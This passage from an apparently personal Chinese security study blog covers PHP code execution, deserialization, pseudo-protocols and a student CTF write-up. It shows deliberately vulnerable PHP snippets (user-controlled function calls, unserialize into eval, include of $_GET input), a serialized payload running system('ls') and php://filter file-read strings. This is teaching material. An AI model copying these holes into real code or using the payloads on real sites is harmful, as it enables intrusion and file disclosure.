+<h3 id="2-用户自定义的函数可以导致代码执行"><a href="#2-用户自定义的函数可以导致代码执行" class="headerlink" title="2.用户自定义的函数可以导致代码执行"></a>2.用户自定义的函数可以导致代码执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dyn_func</span> = <span class="variable">$_GET</span>[<span class="string">&quot;dyn_func&quot;</span>];</span><br><span class="line"><span class="variable">$argument</span> = <span class="variable">$_GET</span>[<span class="string">&quot;argument&quot;</span>];</span><br><span class="line"><span class="variable">$dyn_func</span>(<span class="variable">$argument</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户可以控制函数名和参数时，可能会导致代码的执行。可以进行变量函数，$d什么是一个变量，它存储了一个函数名。在php中可以使用变量来调用函数，这种方式称为变量函数。</p>
+<p>例如，如果$d什么的值是一个”strlen“，那么第三行代码相当于调用strlen函数来获取$a什么的长度。</p>
+<p>参数传递，$a是传递给函数的参数。它可以是任何php数据类型，具体取决于被调用函数的要求。</p>
+<p>例如如果$d什么的值是”echo”，那么第三行代码相当余输出$a什么的值。</p>
+<h3 id="3-反引号"><a href="#3-反引号" class="headerlink" title="3.反引号"></a>3.反引号</h3><p>在php中，反引号和echo配合的时候，会先执行反引号中的命令，再将结果输出。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;ls -al&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述代码会先执行指令，然后输出结果。</p>
+<p>除了echo之外，php中的echo还有一种用法，即php短标签模式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>‘ls -al’<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果同上。</p>
+<h3 id="4-花括号"><a href="#4-花括号" class="headerlink" title="4.花括号"></a>4.花括号</h3><p>在php中，双引号字符串”  “里可以使用花括号中包裹变量或者表达式，php会对花括号内的内容进行计算，并将结果替换到字符串中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$var</span>= <span class="string">&quot;aaabbbccccc$&#123;&#x27;ls&#x27;&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以是代码。</p>
+<h3 id="5-回调函数"><a href="#5-回调函数" class="headerlink" title="5.回调函数"></a>5.回调函数</h3><p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$evil_callback</span> =<span class="variable">$_GET</span>&#123;<span class="string">&quot;callback&quot;</span>&#125;;</span><br><span class="line"><span class="variable">$some_array</span> = <span class="keyword">array</span>&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$evil_callback</span>,<span class="variable">$some_array</span>)；</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-反序列化"><a href="#6-反序列化" class="headerlink" title="6.反序列化"></a>6.反序列化</h3><p>在PHP中，序列化和反序列化是处理对象或数组等复杂数据类型时非常重要的技术。<strong>序列化（Serialization）</strong>是将一个复杂数据类型（如对象或数组）转换成一个可以存储或传输的字符串。<strong>反序列化（Deserialization）</strong>则是将这个字符串还原回原来的复杂数据类型。</p>
+<p><code>serialize()</code> 函数是 PHP 中用于将数据结构（如数组或对象）转换为一个可存储或传输的字符串表示形式的内置函数。这个过程被称为序列化。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">serialize</span> ( <span class="keyword">mixed</span> <span class="variable">$value</span> )</span><br></pre></td></tr></table></figure>
+
+<p><code>unserialize()</code> 函数是 PHP 中用于将序列化后的字符串转换回原来的 PHP 值（如数组或对象）的内置函数。这个过程被称为反序列化。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">unserialize</span> ( <span class="keyword">string</span> <span class="variable">$str</span> )</span><br></pre></td></tr></table></figure>
+
+<p>两个函数搭配使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$var</span> = <span class="string">&quot; &quot;</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;<span class="variable">$var</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span> [<span class="string">&quot;saved_code&quot;</span>])</span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O：<span class="number">7</span>：<span class="string">&quot;Example&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;s:<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>1.	O:7:&quot;Example&quot;:1:
+
+○	O: 表示这是一个对象（Object）。
+
+○	7: 表示对象的类名长度为7个字符。
+
+○	&quot;Example&quot;: 类名是Example。
+
+○	1: 表示这个对象有1个属性。
+
+2.	&#123;s:3:&quot;var&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;
+
+○	s:3:&quot;var&quot;:
+
+●	s: 表示这是一个字符串（String）。
+
+●	3: 表示字符串的键名长度为3个字符。
+
+●	&quot;var&quot;: 键名是var。
+
+○	s:13:&quot;system(&#39;ls&#39;);&quot;;
+
+●	s: 表示这是一个字符串。
+
+●	13: 表示字符串的长度为13个字符。
+
+●	&quot;system(&#39;ls&#39;);&quot;: 字符串的值是system(&#39;ls&#39;);。
+</code></pre>
+<p>整体含义</p>
+<p>这串反序列化字符串表示一个Example类的对象，该对象有一个属性var，其值为system(‘ls’);。</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-25 192858.png)</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-25 192908.png)</p>
+<p>主要的魔术方法 </p>
+<p>1、__get、__set 这两个方法是为在类和他们的父类中没有声明的属性而设计的  </p>
+<p>__get( $property ) 当调用一个未定义的属性时访问此方法</p>
+<p>__ <strong>set( $property, $value ) 给一个未定义的属性赋值时调用 这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</strong></p>
+<p>__ 2、__isset、__unset <strong>isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</strong></p>
+<p>__ <strong>unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法 与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</strong></p>
+<p>__ 3、__call __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法 </p>
+<p>4、__autoload __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 注意: 在 <strong>autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。</strong></p>
+<p>__ 5、__construct、__destruct __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称 __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法 默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用. 在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</p>
+<p> 6、<strong>clone PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</strong></p>
+<p>__ 7、__toString __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。 在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符） 从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</p>
+<p> 8、__sleep、__wakeup __sleep 串行化的时候用 __wakeup 反串行化的时候调用 serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。 使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。 相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</p>
+<p> 9、<strong>set_state 当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ &#x3D;&gt; value, …)格式排列的类属性。</strong></p>
+<p>__ 10、__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效 11、__callStatic 它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。 同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。<br>下面我们通过具体题目来讲解反序列化漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;shield.php&#x27;</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Shield</span>();<span class="comment">//创建了一个shield类的实例</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>];<span class="comment">//检查是否存在class参数，如果存在将其赋值给$g</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$g</span>)) &#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$g</span>);</span><br><span class="line">&#125;<span class="comment">//如果$g不为空，将其反序列化并将其的值赋给$x</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>-&gt;<span class="title function_ invoke__">readfile</span>();</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//readfile 是一个用于读取文件并将其内容直接输出到浏览器或客户端的函数。</span></span><br><span class="line">&lt; img src=<span class="string">&quot;showing.php?img=c2hpZWxkLmpwZw==&amp;width=100%&quot;</span>/&gt;<span class="comment">//HTML标签</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file) &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&#x27;..&#x27;</span>) === <span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&#x27;./&#x27;</span>) === <span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>`</span><br></pre></td></tr></table></figure>
+
+<p>&#96;_wakeup在unserilize()调用之前触发，但如果被反序列化的字符串中对<br>应的对象的属性个数发生变化时，会导致反序列化失败，同时使__wakeup失效</p>
+<h3 id="反序列化进阶"><a href="#反序列化进阶" class="headerlink" title="反序列化进阶"></a>反序列化进阶</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cm8a8wwbc0008mcvq6xre1yoz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-新生赛wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/22/%E6%96%B0%E7%94%9F%E8%B5%9Bwp/" class="article-date">
+  <time class="dt-published" datetime="2024-12-22T06:02:22.933Z" itemprop="datePublished">2024-12-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="第六届信息安全与网络攻防竞赛WP"><a href="#第六届信息安全与网络攻防竞赛WP" class="headerlink" title="第六届信息安全与网络攻防竞赛WP"></a>第六届信息安全与网络攻防竞赛WP</h1><p><strong>计算机-李灿-202408064310</strong></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="比赛须知"><a href="#比赛须知" class="headerlink" title="比赛须知"></a>比赛须知</h3><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-22 134835.png)</p>
+<p>全选变颜色</p>
+<h3 id="隐藏的加密标志"><a href="#隐藏的加密标志" class="headerlink" title="隐藏的加密标志"></a>隐藏的加密标志</h3><p>打开以后发现是一段有空格，特殊重叠的文本，猜测是零宽隐写，得到隐文以后，发现是base64编码，解码以后得到flag</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-22 135250.png)</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-22 135309.png)</p>
+<h3 id="EZ-antsword"><a href="#EZ-antsword" class="headerlink" title="EZ-antsword"></a>EZ-antsword</h3><p>将流量包放在wireshark中追踪http流</p>
+<p><img src="C:\Users\21649\AppData\Roaming\Typora\typora-user-images\image-20241222155422485.png" alt="image-20241222155422485"></p>
+<h3 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h3><p>先进行凯撒解密，逐次去尝试偏移量，然后把解码后的结果放在随波逐流进行解码</p>
+<p><img src="C:\Users\21649\Pictures\Screenshots\微信图片编辑_20241222160156.jpg"></p>
+<h3 id="ing"><a href="#ing" class="headerlink" title="ing"></a>ing</h3><p>将图片拖入图片隐藏信息网站</p>
+<p>![2ae0775f54781eff4e6aa09ba03f4d6](C:\Users\21649\Documents\WeChat Files\wxid_riesr7t61bvs22\FileStorage\Temp\2ae0775f54781eff4e6aa09ba03f4d6.jpg)</p>
+<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="简单恺撒"><a href="#简单恺撒" class="headerlink" title="简单恺撒"></a>简单恺撒</h3><p>打开文件以后发现是一段类似flag形式的字母，根据题目进行恺撒解密，由于偏移量不知道，可以一个个试，当偏移量为5时，得到flag</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-22 135744.png)</p>
+<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>将文件中四个片段分别进行md5解密</p>
+<p>解得分别是 dum  hackers vs  md5</p>
+<p>拼凑在一起得到flag</p>
+<h3 id="dqdp"><a href="#dqdp" class="headerlink" title="dqdp"></a>dqdp</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>from Crypto.Util.number import long_to_bytes import gmpy2 c &#x3D; </p>
+<p>95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885</p>
+<p> p &#x3D; 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243 </p>
+<p>q &#x3D; 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629</p>
+<p> dp &#x3D; 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961</p>
+<p> dq &#x3D; 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659<br>def crt_decrypt(c, p, q, dp, dq):<br>m1 &#x3D; pow(c, dp, p)<br>m2 &#x3D; pow(c, dq, q)</p>
+<p>q_inv &#x3D; gmpy2.invert(q, p)<br>p_inv &#x3D; gmpy2.invert(p, q)<br>h &#x3D; (q_inv * (m1 - m2)) % p<br>m &#x3D; m2 + h * q<br>return mm &#x3D; crt_decrypt(c, p, q, dp, dq)<br>decrypted_message &#x3D; long_to_bytes(m)<br>print(f”Decrypted message: {decrypted_message.decode(‘utf-8’)}”)</p>
+<h3 id="最简单的rsa"><a href="#最简单的rsa" class="headerlink" title="最简单的rsa"></a>最简单的rsa</h3><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>from sympy import mod_inverse<br>p &#x3D; 17640059727611604989  </p>
+<p> q &#x3D; 16047050854299782197 </p>
+<p>n &#x3D; 283070935521868989079397739112298580833</p>
+<p> e &#x3D; 5 c &#x3D; 145201805583017946226008699617573671555<br>phi_n &#x3D; (p - 1) * (q - 1)<br>d &#x3D; mod_inverse(e, phi_n)<br>m &#x3D; pow(c, d, n)<br>message &#x3D; m.to_bytes((m.bit_length() + 7) &#x2F;&#x2F; 8, ‘big’).decode(‘utf-8’)<br>print(“解密后的消息:”, message)</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="猜数字"><a href="#猜数字" class="headerlink" title="猜数字"></a>猜数字</h3><p>直接看网页的源代码，寻找flag，找到flag后面字母是base64，进行base64解码，得到flag</p>
+<p><img src="C:\Users\21649\AppData\Roaming\Typora\typora-user-images\image-20241222160745368.png" alt="image-20241222160745368"></p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-22 140126.png)</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="this-is-for-you"><a href="#this-is-for-you" class="headerlink" title="this is for you"></a>this is for you</h3><p>将网址复制，放在虚拟机，进行查找flag</p>
+<p><img src="C:\Users\21649\Pictures\Screenshots\微信图片_20241222152601.jpg"></p>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>upx脱壳shift加f12查看字符串。</p>
+<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>跟据地图<img src="C:\Users\21649\Pictures\Screenshots\微信图片编辑_20241222180655.jpg"></p>
+<p>根据键盘上的上为w，下为s，左为a，右为d，的顺序，选出最短的路径，然后将得到的字母进行MD5加密得到结果为0105cbd4e70f11b6a982b82f43ad6272</p>
+<h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>![7473edb667ba659e894abfd0e737d3e](C:\Users\21649\Documents\WeChat Files\wxid_riesr7t61bvs22\FileStorage\Temp\7473edb667ba659e894abfd0e737d3e.png)</p>
+<p>发现是异或，将代码输入异或解密网站进行解密，得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/22/%E6%96%B0%E7%94%9F%E8%B5%9Bwp/" data-id="cm8a8wwbd000amcvqhei4fpqx" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-php伪协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/19/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+  <time class="dt-published" datetime="2024-12-19T12:29:44.357Z" itemprop="datePublished">2024-12-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。</p>
+<p>有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。</p>
+<p>allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件<br>allow_url_include On&#x2F;Off 允许或禁止引用URL文件<br>什么时候用php伪协议？</p>
+<p>文件包括！！！的时候，可能会遇到的文件包含函数</p>
+<p>include</p>
+<h5 id="require"><a href="#require" class="headerlink" title="require"></a>require</h5><p>include_once</p>
+<p>require_once</p>
+<p>highlight_file</p>
+<p>show_source</p>
+<p>readfile</p>
+<p>file_get_contents</p>
+<p>file_put_contents</p>
+<p>fopen(比较常见)</p>
+<p>）file:&#x2F;&#x2F; 访问本地文件系统</p>
+<p>2）http:&#x2F;&#x2F; 访问HTTP(S)网址</p>
+<p>3）ftp:&#x2F;&#x2F; 访问FTP(S)URL</p>
+<p>4)php:&#x2F;&#x2F; 访问各个输出输入流</p>
+<p>5)zlib:&#x2F;&#x2F; 处理压缩流</p>
+<p>6)data:&#x2F;&#x2F; 读取数据</p>
+<p>7)glob:&#x2F;&#x2F; 查找匹配的文件路径模式</p>
+<p>8)phar:&#x2F;&#x2F; PHP归档</p>
+<p>9)rar:&#x2F;&#x2F; RAR数据压缩</p>
+<h2 id="常见的PHP伪协议"><a href="#常见的PHP伪协议" class="headerlink" title="常见的PHP伪协议"></a>常见的PHP伪协议</h2><h3 id="php：-input"><a href="#php：-input" class="headerlink" title="php：&#x2F;&#x2F;input"></a>php：&#x2F;&#x2F;input</h3><p>是一个可以访问请求的原始数据的只读流，获取POST请求数据的协议。</p>
+<p>当enctype&#x3D;“multipart&#x2F;form-data”的时候，<code>enctype=&quot;multipart/form-data&quot;</code> 是 HTML 表单（<code>&lt;form&gt;</code> 标签）中的一个属性，用于指定表单数据在发送到服务器时应该如何编码。当你需要在表单中上传文件时，这个属性是必需的。</p>
+<p>具体来说，<code>enctype</code> 是 “encoding type” 的缩写，它定义了表单数据的编码类型。HTML 表单可以支持三种不同的编码类型：</p>
+<ol>
+<li>**<code>application/x-www-form-urlencoded</code>**（默认值）：这是表单数据的标准编码格式。所有的字符都会进行编码（空格转换为 “+” 加号，特殊符号转换为 ASCII HEX 值）。这种编码类型适用于不包含文件上传的表单。</li>
+<li>**<code>multipart/form-data</code>**：这种编码类型用于在表单中包含文件上传。它不会对字符编码，而是将表单数据编码为一条消息，其中包含表示边界的字符串，用于分隔表单中的不同部分。这样，服务器就可以正确地解析文件和数据。</li>
+<li>**<code>text/plain</code>**：这种编码类型将表单数据作为纯文本发送，空格和换行符等字符不进行特殊处理。它很少用于实际的表单提交，因为服务器通常期望接收的是编码后的表单数据。</li>
+</ol>
+<p>当你需要在表单中让用户上传文件时，你应该使用 <code>enctype=&quot;multipart/form-data&quot;</code>。例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;fileToUpload&quot;</span>&gt;</span>选择文件上传:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fileToUpload&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileToUpload&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传文件&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>&lt;form&gt;</code> 标签的 <code>enctype</code> 属性设置为 <code>multipart/form-data</code>，这意味着表单可以包含文件上传。<code>method</code> 属性设置为 <code>post</code>，因为上传文件通常使用 POST 方法。</p>
+<p><em>php：&#x2F;&#x2F;input是无效的。</em></p>
+<p>成功执行的前提是allow_url_include 设置成On</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="php：-filter"><a href="#php：-filter" class="headerlink" title="php：&#x2F;&#x2F;filter"></a>php：&#x2F;&#x2F;filter</h3><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。<br>例子<em><strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64encode&#x2F;resource&#x3D;index.php</strong></em><br> <em><strong>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php</strong></em></p>
